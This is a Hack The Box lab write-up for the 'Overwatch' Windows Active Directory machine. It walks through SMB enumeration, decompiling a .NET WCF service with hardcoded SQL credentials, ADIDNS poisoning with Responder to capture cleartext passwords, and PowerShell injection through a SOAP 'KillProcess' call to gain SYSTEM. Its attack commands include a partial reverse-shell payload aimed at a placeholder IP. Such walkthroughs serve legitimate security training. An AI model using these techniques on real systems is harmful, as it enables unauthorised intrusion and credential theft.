---
title: "HTB Overwatch Writeup"
summary: "An Active Directory machine involving .NET WCF exploitation, SQL credential discovery, and ADIDNS hijacking leading to SYSTEM access."
categories: ["HackTheBox", "Blog"]
tags: ["HackTheBox", "ActiveDirectory", "Windows", "WCF", "MSSQL", "SQLi", "ADIDNS"]
#externalUrl: ""
#showSummary: true
date: 2026-05-10
draft: false

---

# Hack The Box: Overwatch Writeup

---

## Machine Overview
- **Name:** Overwatch
- **OS:** Windows Server 2022
- **Difficulty:** Medium

Overwatch is a Medium difficulty Windows Active Directory machine featuring a custom .NET WCF monitoring service and a misconfigured SMB share exposing internal binaries. Initial access is achieved through reverse engineering a .NET application that reveals hardcoded SQL Server credentials. Further enumeration exposes a linked SQL Server instance and misconfigured Active Directory permissions that allow DNS record creation. This enables ADIDNS poisoning to redirect a failed SQL connection, resulting in credential leakage via NTLM authentication. After obtaining WinRM access as a low-privileged user, enumeration of the WCF service reveals a PowerShell injection vulnerability in the `KillProcess` method. Exploiting this leads to code execution as SYSTEM and full domain compromise.

---

## Reconnaisance
## nmap
As usual I started with nmap scan
```sh
sudo nmap -p- -vvv --min-rate 10000 10.129.70.129
PORT      STATE SERVICE          REASON  
53/tcp    open  domain           syn-ack ttl 127  
88/tcp    open  kerberos-sec     syn-ack ttl 127  
135/tcp   open  msrpc            syn-ack ttl 127  
139/tcp   open  netbios-ssn      syn-ack ttl 127  
389/tcp   open  ldap             syn-ack ttl 127  
445/tcp   open  microsoft-ds     syn-ack ttl 127  
464/tcp   open  kpasswd5         syn-ack ttl 127  
593/tcp   open  http-rpc-epmap   syn-ack ttl 127  
636/tcp   open  ldapssl          syn-ack ttl 127  
3268/tcp  open  globalcatLDAP    syn-ack ttl 127  
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127  
3389/tcp  open  ms-wbt-server    syn-ack ttl 127  
5985/tcp  open  wsman            syn-ack ttl 127  
6520/tcp  open  unknown          syn-ack ttl 127  
9389/tcp  open  adws             syn-ack ttl 127  
49664/tcp open  unknown          syn-ack ttl 127  
49669/tcp open  unknown          syn-ack ttl 127  
52098/tcp open  unknown          syn-ack ttl 127  
52100/tcp open  unknown          syn-ack ttl 127  
54129/tcp open  unknown          syn-ack ttl 127  
54130/tcp open  unknown          syn-ack ttl 127  
58784/tcp open  unknown          syn-ack ttl 127  
58801/tcp open  unknown          syn-ack ttl 127
```

Scanning those open ports
```sh
sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,6520,9389 -sCV 10.129.70.129 -o nmap
PORT     STATE SERVICE       VERSION  
53/tcp   open  domain        Simple DNS Plus  
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-17 14:49:07Z)  
135/tcp  open  msrpc         Microsoft Windows RPC  
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)  
445/tcp  open  microsoft-ds?  
464/tcp  open  kpasswd5?  
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp  open  tcpwrapped  
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: overwatch.htb, Site: Default-First-Site-Name)  
3269/tcp open  tcpwrapped  
3389/tcp open  ms-wbt-server Microsoft Terminal Services  
|_ssl-date: 2026-05-17T14:50:39+00:00; +6s from scanner time.  
| ssl-cert: Subject: commonName=S200401.overwatch.htb  
| Not valid before: 2026-05-16T14:04:16  
|_Not valid after:  2026-11-15T14:04:16  
| rdp-ntlm-info:    
|   Target_Name: OVERWATCH  
|   NetBIOS_Domain_Name: OVERWATCH  
|   NetBIOS_Computer_Name: S200401  
|   DNS_Domain_Name: overwatch.htb  
|   DNS_Computer_Name: S200401.overwatch.htb  
|   DNS_Tree_Name: overwatch.htb  
|   Product_Version: 10.0.20348  
|_  System_Time: 2026-05-17T14:50:00+00:00  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
6520/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback  
| Not valid before: 2026-05-17T14:06:32  
|_Not valid after:  2056-05-17T14:06:32  
|_ssl-date: 2026-05-17T14:50:39+00:00; +6s from scanner time.  
| ms-sql-info:    
|   10.129.70.129:6520:    
|     Version:    
|       name: Microsoft SQL Server 2022 RTM  
|       number: 16.00.1000.00  
|       Product: Microsoft SQL Server 2022  
|       Service pack level: RTM  
|       Post-SP patches applied: false  
|_    TCP port: 6520  
| ms-sql-ntlm-info:    
|   10.129.70.129:6520:    
|     Target_Name: OVERWATCH  
|     NetBIOS_Domain_Name: OVERWATCH  
|     NetBIOS_Computer_Name: S200401  
|     DNS_Domain_Name: overwatch.htb  
|     DNS_Computer_Name: S200401.overwatch.htb  
|     DNS_Tree_Name: overwatch.htb  
|_    Product_Version: 10.0.20348  
9389/tcp open  mc-nmf        .NET Message Framing
```
## smb Enumeration
listing shares as guest
```sh
❯ nxc smb 10.129.70.129 -u '.'  -p '' --shares  
SMB         10.129.70.129   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.70.129   445    S200401          [+] overwatch.htb\.: (Guest)  
SMB         10.129.70.129   445    S200401          [*] Enumerated shares  
SMB         10.129.70.129   445    S200401          Share           Permissions     Remark  
SMB         10.129.70.129   445    S200401          -----           -----------     ------  
SMB         10.129.70.129   445    S200401          ADMIN$                          Remote Admin  
SMB         10.129.70.129   445    S200401          C$                              Default share  
SMB         10.129.70.129   445    S200401          IPC$            READ            Remote IPC  
SMB         10.129.70.129   445    S200401          NETLOGON                        Logon server share    
SMB         10.129.70.129   445    S200401          software$       READ               
SMB         10.129.70.129   445    S200401          SYSVOL                          Logon server share
```

Under software there is a folder `Monitoring` which has some files, lets download the all
```sh
❯ smbclient //10.129.70.129/software$  
Password for [WORKGROUP\kevin]:  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                  DH        0  Sat May 17 04:27:07 2025  
 ..                                DHS        0  Thu Jan  1 09:46:47 2026  
 Monitoring                         DH        0  Sat May 17 04:32:43 2025  
  
               7147007 blocks of size 4096. 953673 blocks available  
smb: \> cd Monitoring  
smb: \Monitoring\> ls  
 .                                  DH        0  Sat May 17 04:32:43 2025  
 ..                                 DH        0  Sat May 17 04:27:07 2025  
 EntityFramework.dll                AH  4991352  Thu Apr 16 23:38:42 2020  
 EntityFramework.SqlServer.dll      AH   591752  Thu Apr 16 23:38:56 2020  
 EntityFramework.SqlServer.xml      AH   163193  Thu Apr 16 23:38:56 2020  
 EntityFramework.xml                AH  3738289  Thu Apr 16 23:38:40 2020  
 Microsoft.Management.Infrastructure.dll     AH    36864  Mon Jul 17 17:46:10 2017  
 overwatch.exe                      AH     9728  Sat May 17 04:19:24 2025  
 overwatch.exe.config               AH     2163  Sat May 17 04:02:30 2025  
 overwatch.pdb                      AH    30208  Sat May 17 04:19:24 2025  
 System.Data.SQLite.dll             AH   450232  Sun Sep 29 23:41:18 2024  
 System.Data.SQLite.EF6.dll         AH   206520  Sun Sep 29 23:40:06 2024  
 System.Data.SQLite.Linq.dll        AH   206520  Sun Sep 29 23:40:42 2024  
 System.Data.SQLite.xml             AH  1245480  Sat Sep 28 21:48:00 2024  
 System.Management.Automation.dll     AH   360448  Mon Jul 17 17:46:10 2017  
 System.Management.Automation.xml     AH  7145771  Mon Jul 17 17:46:10 2017  
 x64                                DH        0  Sat May 17 04:32:33 2025  
 x86                                DH        0  Sat May 17 04:32:33 2025  
  
               7147007 blocks of size 4096. 957301 blocks available  
smb: \Monitoring\> prompt OFF  
smb: \Monitoring\> recurse ON  
smb: \Monitoring\> mget *
```

two files are interesting `overwatch.exe.config` and `overwatch.exe`. 
**`overwatch.exe`** is a .NET application (WCF service) that:
- Hosts a **WCF (Windows Communication Foundation)** SOAP service at `http://overwatch.htb:8000/MonitorService`
- Exposes a **metadata exchange (MEX)** endpoint at `.../mex`
- Uses **Entity Framework 6** with **SQLite** as the backend database
- Has `includeExceptionDetailInFaults="True"` — useful for enumeration

Lets decompile the exe using `ilspycmd`
## overwatch.exe decompiling
Decompiling the exe to a directory
```sh
❯ ilspycmd overwatch.exe -o src
```
we get the file `overwatch.decompiled.cs`
 checking the file there are 3 security issues
 #### 1. PowerShell Injection via `KillProcess()` — **RCE**

```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```
`processName` is directly concatenated into a PowerShell script with **zero sanitization**. You can break out and run arbitrary commands:
```csharp
notepad; whoami | Out-File C:\inetpub\wwwroot\pwned.txt
```
Or a reverse shell:

```csharp
notepad; $c=New-Object Net.Sockets.TCPClient('YOUR_IP',4444);...
```

#### 2. SQL Injection via `LogEvent()` — **SQLi**

```csharp
"INSERT INTO EventLog (...) VALUES (GETDATE(), '" + type + "', '" + detail + "')"
```

Both `type` and `detail` are unsanitized. `detail` comes from:

- Process names (via WMI watcher) — limited control
- Session switch reason — limited control
- **Edge browser URLs** — if you can control a URL visited on the machine

The `CheckEdgeHistory` function reads URLs from the Edge SQLite history and inserts them raw into MSSQL. A URL like the below could dump values from the database.

```
http://x', (SELECT password_hash FROM users))--
```

#### 3. Hardcoded SQL Server Credentials

```csharp
"Server=localhost;Database=SecurityLogs;User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"
```

Credentials for the `sqlsvc` account: **`TI0LKcfHzZw1Vv`** 

Lets start by trying the credentials on mssql.
## MSSQL
From nmap, mssql is running on port `6520`
```sh
mssqlclient.py -port 6520 sqlsvc:'TI0LKcfHzZw1Vv'@10.129.70.129 -windows-auth
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Encryption required, switching to TLS  
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master  
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english  
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192  
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed database context to 'master'.  
[*] INFO(S200401\SQLEXPRESS): Line 1: Changed language setting to us_english.  
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)  
[!] Press help for extra shell commands  
SQL (OVERWATCH\sqlsvc  guest@master)>
```

Enum linked servers
```sql
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> enum_links  
SRV_NAME             SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE       SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT      
------------------   ----------------   -----------   ------------------   ------------------   ------------   -------      
S200401\SQLEXPRESS   SQLNCLI            SQL Server    S200401\SQLEXPRESS   NULL                 NULL           NULL         
SQL07                SQLNCLI            SQL Server    SQL07                NULL                 NULL           NULL         
Linked Server   Local Login   Is Self Mapping   Remote Login
```
There is a linked server `SQL07`. 
Trying to use the server does not respond 
```sql
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> use_link [SQL07]  
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "Login timeout expired".  
INFO(S200401\SQLEXPRESS): Line 1: OLE DB provider "MSOLEDBSQL" for linked server "SQL07" returned message "A network-related or instance-specific error has occurred while establishing a connection to SQL Server. Server is not found or no  
t accessible. Check if instance name is correct and if SQL Server is configured to allow remote connections. For more information see SQL Server Books Online.".  
ERROR(MSOLEDBSQL): Line 0: Named Pipes Provider: Could not open a connection to SQL Server [64].
```
It’s unable to find the server. I can try to run a command directly, but it does the same:
```sql
SQL (OVERWATCH\sqlsvc  dbo@overwatch)> EXEC ('SELECT SYSTEM_USER') AT [SQL07];
```
The SQL07 machine isn’t responding. I can try to look it up from the DC’s DNS:
```sh
❯ nslookup SQL07.overwatch.htb S200401.overwatch.htb  
Server:         S200401.overwatch.htb  
Address:        10.129.70.129#53  
  
** server can't find SQL07.overwatch.htb: NXDOMAIN  
  
❯ nslookup SQL07 S200401.overwatch.htb  
;; Got SERVFAIL reply from 10.129.70.129  
Server:         S200401.overwatch.htb  
Address:        10.129.70.129#53  
  
** server can't find SQL07: SERVFAIL
```


## sqlsvc ACLS
Lets check what ACLs the sqlsvc account has. `bloodyAD` has a nice check, `get writable`:
```sh
❯ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv get writable  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=overwatch,DC=htb  
permission: WRITE  
  
distinguishedName: CN=sqlsvc,CN=Users,DC=overwatch,DC=htb  
permission: WRITE  
  
distinguishedName: DC=overwatch.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=overwatch,DC=htb  
permission: CREATE_CHILD  
  
distinguishedName: DC=_msdcs.overwatch.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=overwatch,DC=htb  
permission: CREATE_CHILD
```

What You Have with `sqlsvc`
- **WRITE on own account** (`CN=sqlsvc`) — can modify your own AD object
- **CREATE_CHILD on DNS zones** — this is significant
Since `SQL07` was not resolving,we can point it at ourself and capture auth (NTLM relay or Kerberos).
## DNS Admin → Privilege Escalation via ADIDNS
```sh
❯ bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv \  
 add dnsRecord SQL07 10.10.16.131  
[+] SQL07 has been successfully added
```

Start responder `❯ sudo responder -I tun0 -A`

Trigger it using `
`use_link [SQL07]`

We get credentials
```sh
[MSSQL] Cleartext Client   : 10.129.70.129  
[MSSQL] Cleartext Hostname : SQL07 ()  
[MSSQL] Cleartext Username : sqlmgmt  
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

## User.txt
Given we have creds, lets try them on `winrm`
```sh
❯ nxc winrm 10.129.70.129 -u sqlmgmt -p 'bIhBbzMMnB82yx'  
WINRM       10.129.70.129   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)    
WINRM       10.129.70.129   5985   S200401          [+] overwatch.htb\sqlmgmt:bIhBbzMMnB82yx (Pwn3d!)
```
It works, now lets use `evilwinrm`
```sh
❯ evil-winrm -i 10.129.70.129 -u sqlmgmt -p 'bIhBbzMMnB82yx'  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/gems/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/lib/ruby/gems/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> dir  
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> ls  
*Evil-WinRM* PS C:\Users\sqlmgmt\Documents> cd ../  
*Evil-WinRM* PS C:\Users\sqlmgmt> ls  
  
  
   Directory: C:\Users\sqlmgmt  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
d-r---         5/16/2025   8:09 PM                Desktop  
d-r---         5/16/2025   8:08 PM                Documents  
d-r---          5/8/2021   1:20 AM                Downloads  
d-r---          5/8/2021   1:20 AM                Favorites  
d-r---          5/8/2021   1:20 AM                Links  
d-r---          5/8/2021   1:20 AM                Music  
d-r---          5/8/2021   1:20 AM                Pictures  
d-----          5/8/2021   1:20 AM                Saved Games  
d-r---          5/8/2021   1:20 AM                Videos  
  
  
*Evil-WinRM* PS C:\Users\sqlmgmt> cd Desktop  
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> ls  
  
  
   Directory: C:\Users\sqlmgmt\Desktop  
  
  
Mode                 LastWriteTime         Length Name  
----                 -------------         ------ ----  
-ar---         5/17/2026   7:05 AM             34 user.txt
```

# Priv escalation

Since we are not inside a machine, lets see if we can access the monitor service on port 8000
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> curl -UseBasicParsing http://overwatch.htb:8000/MonitorService  
  
  
StatusCode        : 200  
StatusDescription : OK  
Content           : <HTML lang="en"><HEAD><link rel="alternate" type="text/xml" href="http://overwatch.htb:8000/MonitorService?disco"/><STYLE type="text/css">#content{ FONT-SIZE: 0.7em; PADDING-BOTTOM: 2em; MARGIN-LEFT: ...  
RawContent        : HTTP/1.1 200 OK  
                   Content-Length: 3077  
                   Content-Type: text/html; charset=UTF-8  
                   Date: Sun, 17 May 2026 15:34:45 GMT  
                   Server: Microsoft-HTTPAPI/2.0  
  
                   <HTML lang="en"><HEAD><link rel="alternate" type="t...  
Forms             :  
Headers           : {[Content-Length, 3077], [Content-Type, text/html; charset=UTF-8], [Date, Sun, 17 May 2026 15:34:45 GMT], [Server, Microsoft-HTTPAPI/2.0]}  
Images            : {}  
InputFields       : {}  
Links             : {@{outerHTML=<A HREF="http://overwatch.htb:8000/MonitorService?wsdl">http://overwatch.htb:8000/MonitorService?wsdl</A>; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?wsdl}, @{outerHTML=<A  
                   HREF="http://overwatch.htb:8000/MonitorService?singleWsdl">http://overwatch.htb:8000/MonitorService?singleWsdl</A>; tagName=A; HREF=http://overwatch.htb:8000/MonitorService?singleWsdl}}  
ParsedHtml        :  
RawContentLength  : 3077
```

## Full wsdl content
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> $wsdl = (Invoke-WebRequest -Uri "http://overwatch.htb:8000/MonitorService?wsdl" -UseBasicParsing).Content
$wsdl
<?xml version="1.0" encoding="utf-8"?><wsdl:definitions name="MonitoringService" targetNamespace="http://tempuri.org/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:wsx="http://schemas.xmlsoap.org/ws/2004/09/mex" xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd" xmlns:wsa10="http://www.w3.org/2005/08/addressing" xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy" xmlns:wsap="http://schemas.xmlsoap.org/ws/2004/08/addressing/policy" xmlns:msc="http://schemas.microsoft.com/ws/2005/12/wsdl/contract" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:wsam="http://www.w3.org/2007/05/addressing/metadata" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:tns="http://tempuri.org/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:wsaw="http://www.w3.org/2006/05/addressing/wsdl" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/"><wsdl:types><xsd:schema targetNamespace="http://tempuri.org/Imports"><xsd:import schemaLocation="http://overwatch.htb:8000/MonitorService?xsd=xsd0" namespace="http://tempuri.org/"/><xsd:import schemaLocation="http://overwatch.htb:8000/MonitorService?xsd=xsd1" namespace="http://schemas.microsoft.com/2003/10/Serialization/"/></xsd:schema></wsdl:types><wsdl:message name="IMonitoringService_StartMonitoring_InputMessage"><wsdl:part name="parameters" element="tns:StartMonitoring"/></wsdl:message><wsdl:message name="IMonitoringService_StartMonitoring_OutputMessage"><wsdl:part name="parameters" element="tns:StartMonitoringResponse"/></wsdl:message><wsdl:message name="IMonitoringService_StopMonitoring_InputMessage"><wsdl:part name="parameters" element="tns:StopMonitoring"/></wsdl:message><wsdl:message name="IMonitoringService_StopMonitoring_OutputMessage"><wsdl:part name="parameters" element="tns:StopMonitoringResponse"/></wsdl:message><wsdl:message name="IMonitoringService_KillProcess_InputMessage"><wsdl:part name="parameters" element="tns:KillProcess"/></wsdl:message><wsdl:message name="IMonitoringService_KillProcess_OutputMessage"><wsdl:part name="parameters" element="tns:KillProcessResponse"/></wsdl:message><wsdl:portType name="IMonitoringService"><wsdl:operation name="StartMonitoring"><wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoring" message="tns:IMonitoringService_StartMonitoring_InputMessage"/><wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StartMonitoringResponse" message="tns:IMonitoringService_StartMonitoring_OutputMessage"/></wsdl:operation><wsdl:operation name="StopMonitoring"><wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoring" message="tns:IMonitoringService_StopMonitoring_InputMessage"/><wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/StopMonitoringResponse" message="tns:IMonitoringService_StopMonitoring_OutputMessage"/></wsdl:operation><wsdl:operation name="KillProcess"><wsdl:input wsaw:Action="http://tempuri.org/IMonitoringService/KillProcess" message="tns:IMonitoringService_KillProcess_InputMessage"/><wsdl:output wsaw:Action="http://tempuri.org/IMonitoringService/KillProcessResponse" message="tns:IMonitoringService_KillProcess_OutputMessage"/></wsdl:operation></wsdl:portType><wsdl:binding name="BasicHttpBinding_IMonitoringService" type="tns:IMonitoringService"><soap:binding transport="http://schemas.xmlsoap.org/soap/http"/><wsdl:operation name="StartMonitoring"><soap:operation soapAction="http://tempuri.org/IMonitoringService/StartMonitoring" style="document"/><wsdl:input><soap:body use="literal"/></wsdl:input><wsdl:output><soap:body use="literal"/></wsdl:output></wsdl:operation><wsdl:operation name="StopMonitoring"><soap:operation soapAction="http://tempuri.org/IMonitoringService/StopMonitoring" style="document"/><wsdl:input><soap:body use="literal"/></wsdl:input><wsdl:output><soap:body use="literal"/></wsdl:output></wsdl:operation><wsdl:operation name="KillProcess"><soap:operation soapAction="http://tempuri.org/IMonitoringService/KillProcess" style="document"/><wsdl:input><soap:body use="literal"/></wsdl:input><wsdl:output><soap:body use="literal"/></wsdl:output></wsdl:operation></wsdl:binding><wsdl:service name="MonitoringService"><wsdl:port name="BasicHttpBinding_IMonitoringService" binding="tns:BasicHttpBinding_IMonitoringService"><soap:address location="http://overwatch.htb:8000/MonitorService"/></wsdl:port></wsdl:service></wsdl:definitions>

```

remember PowerShell Injection vulnerability via `KillProcess()

```csharp
string scriptContents = "Stop-Process -Name " + processName + " -Force";
```

`processName` is directly concatenated into a PowerShell script with **zero sanitization**. You can break out and run arbitrary commands:

```
notepad; whoami | Out-File C:\inetpub\wwwroot\pwned.txt
```
 From the xml we have everything we need
 - SOAPAction: `http://tempuri.org/IMonitoringService/KillProcess`
- Parameter name: `processName` 
- Style: `document/literal`

## root
to get the root flag
```powershell
$cmd = "notepad; type C:\Users\Administrator\Desktop\root.txt | Out-File C:\Users\sqlmgmt\Desktop\root.txt"

$body = '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>' + $cmd + '</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>'

$r = Invoke-WebRequest -Uri "http://overwatch.htb:8000/MonitorService" `
    -Method POST -Headers $headers -Body $body -UseBasicParsing

type C:\Users\sqlmgmt\Desktop\root.txt
```

We get flag
```powershell
*Evil-WinRM* PS C:\Users\sqlmgmt\Desktop> type C:\Users\sqlmgmt\Desktop\root.txt  
   
aa154660791f899b1eeb5fa597bf60af
```
